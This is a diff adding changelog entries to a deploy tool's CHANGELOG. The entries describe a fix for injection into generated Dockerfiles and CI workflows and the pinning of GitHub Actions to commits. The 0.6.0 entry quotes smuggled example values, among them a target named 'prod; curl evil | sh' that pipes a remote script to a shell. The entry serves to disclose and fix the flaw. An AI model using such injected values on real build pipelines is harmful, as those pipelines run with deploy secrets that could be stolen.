@@ -1,5 +1,15 @@
 # @blixis-io/deploy
 
+## 0.6.0
+
+### Minor Changes
+
+- [#134](https://github.com/blixis-io/framework/pull/134) [`f505e5c`](https://github.com/blixis-io/framework/commit/f505e5cd66872178b87e4974573dfef84bc4621f) Thanks [@EmVeeNL](https://github.com/EmVeeNL)! - Names copied into generated files are now checked, and the branch is quoted. `blix deploy` writes names from flags and from `blix.config.ts` into a Dockerfile and into CI files that run with your deploy secrets, and until now a newline, a quote, a `;` or a `$(...)` in one of them was copied through: `--entry 'dist/main.js", "--evil'` added an argument to the Dockerfile's `CMD`, a newline in it added a whole instruction, and a target named `prod; curl evil | sh` became a shell command in the workflow. The Dockerfile `CMD` now writes the entry as a JSON string, so any entry stays one argument; a target name, an environment variable name (`env`, `registry.usernameEnv`, `registry.passwordEnv`) and the `--branch` must now be plain names (the rules are in the deploying guide) and anything else is refused with a message naming the value, in the config and again where each file is rendered. Branches are always quoted in the YAML (`branches: ["main"]`, `"release":` for Bitbucket): a branch named `1.0` was read as the number 1 and a branch `-` did not parse. Behaviour change: a config or flag that used a name outside those rules (a target with a space, an env name that is `NO` or `true`, a branch starting with `-` or `.`) is now an error, and regenerating a CI file with `--force` changes `branches: [main]` to `branches: ["main"]`. Found by property tests that parse the generated files.
+
+### Patch Changes
+
+- [#109](https://github.com/blixis-io/framework/pull/109) [`3d517ef`](https://github.com/blixis-io/framework/commit/3d517ef53ca2460ec7f84cb3b51f69068aa77248) Thanks [@EmVeeNL](https://github.com/EmVeeNL)! - The generated GitHub Actions workflow pins its actions to a commit instead of a tag. It runs with your deploy secrets, and a tag such as `actions/checkout@v4` can be moved by whoever controls the action's repository, so the file now says `actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4` (likewise `setup-node`, `pnpm/action-setup` and, for bun, `oven-sh/setup-bun`). Regenerate with `blix deploy ci github --force` to pick this up, and add Dependabot's `github-actions` ecosystem to keep the pins current; it understands the tag in the comment. The GitLab and Bitbucket files use container images, not actions, and are unchanged.
+
 ## 0.5.0
 
 ### Minor Changes
